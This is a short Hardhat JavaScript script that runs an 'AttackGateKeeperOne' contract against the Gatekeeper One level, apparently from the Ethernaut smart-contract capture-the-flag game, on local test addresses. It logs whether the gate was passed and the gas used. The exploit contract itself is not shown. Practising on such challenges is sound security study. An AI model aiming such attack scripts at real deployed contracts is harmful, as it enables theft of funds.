import { ethers } from "hardhat";

async function attackGateKeeperOne() {
    // change contract address and arguments here
    const _gateAddress = "0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512";
    const _gasLowerLimit = 200;
    const _gasUpperLimit = 300;
    const contractAddress = "0x5FbDB2315678afecb367f032d93F642f64180aa3";
    // don't touch below
    const attack = await ethers.getContractAt("AttackGateKeeperOne", contractAddress);
    const tx = await attack.enterGate(_gateAddress, _gasLowerLimit, _gasUpperLimit);
    const txReceipt = await tx.wait(1);
    const event1 = await txReceipt.events[0].args.succeeded.toString();
    const event2 = await txReceipt.events[0].args.gasUsed.toString();
    console.log(`You passed this(Gatekeeper One) level: ${event1}`);
    console.log(`Gas used: ${event2}`);
}

attackGateKeeperOne()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
